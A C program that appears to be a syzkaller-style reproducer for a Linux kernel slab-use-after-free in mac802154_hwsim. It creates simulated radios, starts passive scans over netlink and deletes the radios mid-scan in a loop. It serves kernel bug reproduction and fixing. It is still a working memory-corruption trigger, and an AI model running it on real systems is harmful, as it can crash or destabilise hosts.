// https://syzkaller.appspot.com/bug?id=9d4ca3954601c02359c39a8e3ec436db305f8d95
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif
#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_TYPE_MASK
#define NLA_TYPE_MASK ~(NLA_F_NESTED | NLA_F_NET_BYTEORDER)
#endif

#define NL802154_CMD_TRIGGER_SCAN 35
#define NL802154_ATTR_IFINDEX 3
#define NL802154_ATTR_SCAN_TYPE 31
#define NL802154_ATTR_SCAN_DURATION 36
#define NL802154_SCAN_PASSIVE 3

#define MAC802154_HWSIM_CMD_GET_RADIO 1
#define MAC802154_HWSIM_CMD_NEW_RADIO 3
#define MAC802154_HWSIM_CMD_DEL_RADIO 4
#define MAC802154_HWSIM_ATTR_RADIO_ID 1

static uint32_t g_seq = 1000;

static int resolve_family_id(int nl_fd, const char *family_name)
{
    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
        char buf[256];
    } req;

    memset(&req, 0, sizeof(req));
    req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    req.n.nlmsg_flags = NLM_F_REQUEST;
    req.n.nlmsg_type = GENL_ID_CTRL;
    req.n.nlmsg_seq = ++g_seq;
    req.n.nlmsg_pid = 0;
    req.g.cmd = CTRL_CMD_GETFAMILY;
    req.g.version = 1;

    struct nlattr *nla = (struct nlattr *)((char *)&req + NLMSG_ALIGN(req.n.nlmsg_len));
    int name_len = strlen(family_name) + 1;
    nla->nla_type = CTRL_ATTR_FAMILY_NAME;
    nla->nla_len = NLA_HDRLEN + name_len;
    memcpy((char *)nla + NLA_HDRLEN, family_name, name_len);
    req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + NLA_ALIGN(nla->nla_len);

    struct sockaddr_nl dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0;

    int res = sendto(nl_fd, &req, req.n.nlmsg_len, 0,
                     (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        printf("[-] Failed to send CTRL_CMD_GETFAMILY for %s: %s\n", family_name, strerror(errno));
        return -1;
    }

    char ans[8192];
    res = recv(nl_fd, ans, sizeof(ans), 0);
    if (res < 0) {
        printf("[-] Failed to recv generic netlink response for %s: %s\n", family_name, strerror(errno));
        return -1;
    }

    int len = res;
    struct nlmsghdr *nlh = (struct nlmsghdr *)ans;
    while (NLMSG_OK(nlh, len)) {
        if (nlh->nlmsg_seq == g_seq) {
            if (nlh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(nlh);
                printf("[-] Netlink error for %s: %s (code %d)\n",
                       family_name, strerror(-err->error), err->error);
                return -1;
            }
            if (nlh->nlmsg_type == GENL_ID_CTRL) {
                struct genlmsghdr *ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
                struct nlattr *attr = (struct nlattr *)((char *)ghdr + GENL_HDRLEN);
                int attr_rem = nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
                while (attr_rem >= (int)sizeof(struct nlattr)) {
                    if (attr->nla_len < sizeof(struct nlattr) || attr->nla_len > attr_rem)
                        break;
                    if ((attr->nla_type & NLA_TYPE_MASK) == CTRL_ATTR_FAMILY_ID) {
                        uint16_t fam_id = *(uint16_t *)((char *)attr + NLA_HDRLEN);
                        return fam_id;
                    }
                    int aligned_len = NLA_ALIGN(attr->nla_len);
                    attr_rem -= aligned_len;
                    attr = (struct nlattr *)((char *)attr + aligned_len);
                }
            }
        }
        nlh = NLMSG_NEXT(nlh, len);
    }

    printf("[-] Could not find family ID for %s in netlink response.\n", family_name);
    return -1;
}

static int set_interface_up(const char *ifname)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        printf("[-] Failed to open socket for SIOCSIFFLAGS: %s\n", strerror(errno));
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    int res = ioctl(s, SIOCGIFFLAGS, &ifr);
    if (res < 0) {
        printf("[-] Failed ioctl(SIOCGIFFLAGS) for %s: %s\n", ifname, strerror(errno));
        close(s);
        return -1;
    }

    if (!(ifr.ifr_flags & IFF_UP)) {
        ifr.ifr_flags |= (IFF_UP | IFF_RUNNING);
        res = ioctl(s, SIOCSIFFLAGS, &ifr);
        if (res < 0) {
            printf("[-] Failed ioctl(SIOCSIFFLAGS) to bring up %s: %s\n", ifname, strerror(errno));
            close(s);
            return -1;
        }
        printf("[+] Interface %s brought UP.\n", ifname);
    } else {
        printf("[+] Interface %s is already UP.\n", ifname);
    }

    close(s);
    return 0;
}

static int hwsim_create_radio(int nl_fd, int hwsim_fam_id)
{
    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
    } req;

    memset(&req, 0, sizeof(req));
    req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    req.n.nlmsg_flags = NLM_F_REQUEST;
    req.n.nlmsg_type = hwsim_fam_id;
    req.n.nlmsg_seq = ++g_seq;
    req.g.cmd = MAC802154_HWSIM_CMD_NEW_RADIO;
    req.g.version = 1;

    struct sockaddr_nl dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;

    int res = sendto(nl_fd, &req, req.n.nlmsg_len, 0,
                     (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        printf("[-] Failed to send MAC802154_HWSIM_CMD_NEW_RADIO: %s\n", strerror(errno));
        return -1;
    }

    char ans[4096];
    res = recv(nl_fd, ans, sizeof(ans), 0);
    if (res < 0) {
        printf("[-] Failed to recv response for NEW_RADIO: %s\n", strerror(errno));
        return -1;
    }

    struct nlmsghdr *nlh = (struct nlmsghdr *)ans;
    if (NLMSG_OK(nlh, res) && nlh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *errmsg = (struct nlmsgerr *)NLMSG_DATA(nlh);
        if (errmsg->error < 0) {
            printf("[-] NEW_RADIO failed with error %d: %s\n",
                   errmsg->error, strerror(-errmsg->error));
            return -1;
        }
        printf("[+] Created new radio with ID %d\n", errmsg->error);
        return errmsg->error;
    }
    return 0;
}

static int get_existing_radios(int nl_fd, int hwsim_fam_id, uint32_t *radios, int max_radios)
{
    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
    } req;

    memset(&req, 0, sizeof(req));
    req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    req.n.nlmsg_type = hwsim_fam_id;
    req.n.nlmsg_seq = ++g_seq;
    req.g.cmd = MAC802154_HWSIM_CMD_GET_RADIO;
    req.g.version = 1;

    struct sockaddr_nl dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;

    int res = sendto(nl_fd, &req, req.n.nlmsg_len, 0,
                     (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        printf("[-] Failed to send GET_RADIO dump request: %s\n", strerror(errno));
        return -1;
    }

    int count = 0;
    char ans[8192];
    while (1) {
        res = recv(nl_fd, ans, sizeof(ans), 0);
        if (res <= 0)
            break;
        int len = res;
        struct nlmsghdr *nlh = (struct nlmsghdr *)ans;
        for (; NLMSG_OK(nlh, len); nlh = NLMSG_NEXT(nlh, len)) {
            if (nlh->nlmsg_type == NLMSG_DONE)
                return count;
            if (nlh->nlmsg_type == NLMSG_ERROR)
                return -1;
            if (nlh->nlmsg_type == hwsim_fam_id) {
                struct genlmsghdr *ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
                struct nlattr *attr = (struct nlattr *)((char *)ghdr + GENL_HDRLEN);
                int attr_rem = nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
                while (attr_rem >= (int)sizeof(struct nlattr)) {
                    if (attr->nla_len < sizeof(struct nlattr) || attr->nla_len > attr_rem)
                        break;
                    if ((attr->nla_type & NLA_TYPE_MASK) == MAC802154_HWSIM_ATTR_RADIO_ID) {
                        uint32_t rid = *(uint32_t *)((char *)attr + NLA_HDRLEN);
                        if (count < max_radios)
                            radios[count++] = rid;
                    }
                    int aligned_len = NLA_ALIGN(attr->nla_len);
                    attr_rem -= aligned_len;
                    attr = (struct nlattr *)((char *)attr + aligned_len);
                }
            }
        }
    }
    return count;
}

static int trigger_scan(int nl_fd, int nl802154_fam_id, uint32_t ifidx)
{
    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
        char buf[256];
    } req;

    memset(&req, 0, sizeof(req));
    req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.n.nlmsg_type = nl802154_fam_id;
    req.n.nlmsg_seq = ++g_seq;
    req.g.cmd = NL802154_CMD_TRIGGER_SCAN;
    req.g.version = 1;

    /* NL802154_ATTR_IFINDEX (3, u32) */
    struct nlattr *nla = (struct nlattr *)((char *)&req + NLMSG_ALIGN(req.n.nlmsg_len));
    nla->nla_type = NL802154_ATTR_IFINDEX;
    nla->nla_len = NLA_HDRLEN + sizeof(uint32_t);
    *(uint32_t *)((char *)nla + NLA_HDRLEN) = ifidx;
    req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + NLA_ALIGN(nla->nla_len);

    /* NL802154_ATTR_SCAN_TYPE (31, u8) */
    nla = (struct nlattr *)((char *)&req + NLMSG_ALIGN(req.n.nlmsg_len));
    nla->nla_type = NL802154_ATTR_SCAN_TYPE;
    nla->nla_len = NLA_HDRLEN + sizeof(uint8_t);
    *(uint8_t *)((char *)nla + NLA_HDRLEN) = NL802154_SCAN_PASSIVE;
    req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + NLA_ALIGN(nla->nla_len);

    /* NL802154_ATTR_SCAN_DURATION (36, u8) */
    nla = (struct nlattr *)((char *)&req + NLMSG_ALIGN(req.n.nlmsg_len));
    nla->nla_type = NL802154_ATTR_SCAN_DURATION;
    nla->nla_len = NLA_HDRLEN + sizeof(uint8_t);
    *(uint8_t *)((char *)nla + NLA_HDRLEN) = 14;
    req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + NLA_ALIGN(nla->nla_len);

    struct sockaddr_nl dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;

    int res = sendto(nl_fd, &req, req.n.nlmsg_len, 0,
                     (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        printf("[-] Failed to send TRIGGER_SCAN for ifindex %u: %s\n", ifidx, strerror(errno));
        return -1;
    }
    printf("[+] sendto TRIGGER_SCAN for ifindex %u successful.\n", ifidx);

    char ans[4096];
    res = recv(nl_fd, ans, sizeof(ans), 0);
    if (res < 0) {
        printf("[-] Failed to recv response for TRIGGER_SCAN: %s\n", strerror(errno));
        return -1;
    }

    struct nlmsghdr *nlh = (struct nlmsghdr *)ans;
    if (NLMSG_OK(nlh, res) && nlh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(nlh);
        if (err->error != 0) {
            printf("[-] TRIGGER_SCAN returned error %d: %s\n",
                   err->error, strerror(-err->error));
            return -1;
        }
        printf("[+] TRIGGER_SCAN acknowledged successfully for ifindex %u.\n", ifidx);
        return 0;
    }
    return 0;
}

static int hwsim_del_radio(int nl_fd, int hwsim_fam_id, uint32_t radio_id)
{
    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
        char buf[64];
    } req;

    memset(&req, 0, sizeof(req));
    req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.n.nlmsg_type = hwsim_fam_id;
    req.n.nlmsg_seq = ++g_seq;
    req.g.cmd = MAC802154_HWSIM_CMD_DEL_RADIO;
    req.g.version = 1;

    struct nlattr *nla = (struct nlattr *)((char *)&req + NLMSG_ALIGN(req.n.nlmsg_len));
    nla->nla_type = MAC802154_HWSIM_ATTR_RADIO_ID;
    nla->nla_len = NLA_HDRLEN + sizeof(uint32_t);
    *(uint32_t *)((char *)nla + NLA_HDRLEN) = radio_id;
    req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + NLA_ALIGN(nla->nla_len);

    struct sockaddr_nl dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;

    printf("[*] Sending DEL_RADIO for radio ID %u...\n", radio_id);
    int res = sendto(nl_fd, &req, req.n.nlmsg_len, 0,
                     (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        printf("[-] Failed to send DEL_RADIO for radio ID %u: %s\n",
               radio_id, strerror(errno));
        return -1;
    }
    printf("[+] sendto DEL_RADIO for radio ID %u successful.\n", radio_id);

    char ans[4096];
    res = recv(nl_fd, ans, sizeof(ans), 0);
    if (res > 0) {
        struct nlmsghdr *nlh = (struct nlmsghdr *)ans;
        if (NLMSG_OK(nlh, res) && nlh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *errmsg = (struct nlmsgerr *)NLMSG_DATA(nlh);
            if (errmsg->error != 0) {
                printf("[*] DEL_RADIO for radio %u returned: %d (%s)\n",
                       radio_id, errmsg->error, strerror(-errmsg->error));
            } else {
                printf("[+] DEL_RADIO for radio %u deleted cleanly.\n", radio_id);
            }
        }
    }

    return 0;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Starting reproducer for mac802154_hwsim slab-use-after-free...\n");

    int nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (nl_fd < 0) {
        printf("[-] Failed to open NETLINK_GENERIC socket: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC) successful.\n");

    struct sockaddr_nl sa;
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    int res = bind(nl_fd, (struct sockaddr *)&sa, sizeof(sa));
    if (res < 0) {
        printf("[-] Failed to bind netlink socket: %s\n", strerror(errno));
        close(nl_fd);
        exit(1);
    }
    printf("[+] bind() successful for netlink socket.\n");

    struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
    res = setsockopt(nl_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (res < 0) {
        printf("[-] Failed to setsockopt SO_RCVTIMEO: %s\n", strerror(errno));
        close(nl_fd);
        exit(1);
    }
    printf("[+] setsockopt(SO_RCVTIMEO) successful.\n");

    int nl802154_id = resolve_family_id(nl_fd, "nl802154");
    if (nl802154_id < 0) {
        printf("[-] Failed to resolve nl802154 family ID.\n");
        close(nl_fd);
        exit(1);
    }
    printf("[+] Resolved nl802154 family ID: %d\n", nl802154_id);

    int hwsim_id = resolve_family_id(nl_fd, "MAC802154_HWSIM");
    if (hwsim_id < 0) {
        printf("[-] Failed to resolve MAC802154_HWSIM family ID.\n");
        close(nl_fd);
        exit(1);
    }
    printf("[+] Resolved MAC802154_HWSIM family ID: %d\n", hwsim_id);

    for (int iter = 0; iter < 10; iter++) {
        printf("\n[*] === Iteration %d ===\n", iter);

        /* Check for existing wpan interfaces */
        struct if_nameindex *iflist = if_nameindex();
        int wpan_count = 0;
        if (iflist) {
            for (int i = 0; iflist[i].if_index != 0; i++) {
                if (strncmp(iflist[i].if_name, "wpan", 4) == 0)
                    wpan_count++;
            }
            if_freenameindex(iflist);
        }

        if (wpan_count == 0) {
            printf("[*] No wpan interfaces found, creating new radio...\n");
            res = hwsim_create_radio(nl_fd, hwsim_id);
            if (res < 0) {
                printf("[-] Failed to create radio via MAC802154_HWSIM.\n");
                close(nl_fd);
                exit(1);
            }
            usleep(100000);
        }

        /* Bring up and trigger scan on each wpan interface */
        iflist = if_nameindex();
        if (!iflist) {
            printf("[-] if_nameindex failed: %s\n", strerror(errno));
            close(nl_fd);
            exit(1);
        }

        for (int i = 0; iflist[i].if_index != 0; i++) {
            if (strncmp(iflist[i].if_name, "wpan", 4) != 0)
                continue;

            printf("[*] Setting up interface %s (index %u)...\n",
                   iflist[i].if_name, iflist[i].if_index);
            res = set_interface_up(iflist[i].if_name);
            if (res < 0) {
                printf("[-] Failed to bring up %s\n", iflist[i].if_name);
                continue;
            }

            printf("[*] Triggering scan on %s (index %u)...\n",
                   iflist[i].if_name, iflist[i].if_index);
            res = trigger_scan(nl_fd, nl802154_id, iflist[i].if_index);
            if (res < 0) {
                printf("[-] Failed to trigger scan on %s\n", iflist[i].if_name);
            }
        }
        if_freenameindex(iflist);

        /* Allow mac802154_scan_worker to run drv_start, allocate new pib, and enter scan wait */
        printf("[*] Waiting 100ms for scan worker to start...\n");
        usleep(100000);

        /* Query existing radios */
        uint32_t radios[32];
        int num_radios = get_existing_radios(nl_fd, hwsim_id, radios, 32);
        printf("[+] Found %d existing radios.\n", num_radios);

        if (num_radios > 0) {
            for (int r = 0; r < num_radios; r++) {
                printf("[*] Deleting radio ID %u (scanning interface will abort)...\n", radios[r]);
                hwsim_del_radio(nl_fd, hwsim_id, radios[r]);
                usleep(200000);
            }
        } else {
            for (uint32_t r = 0; r < 4; r++) {
                printf("[*] Fallback: deleting radio ID %u...\n", r);
                hwsim_del_radio(nl_fd, hwsim_id, r);
                usleep(200000);
            }
        }
    }

    res = close(nl_fd);
    if (res < 0) {
        printf("[-] Failed to close netlink socket: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] All iterations finished cleanly.\n");
    return 0;
}
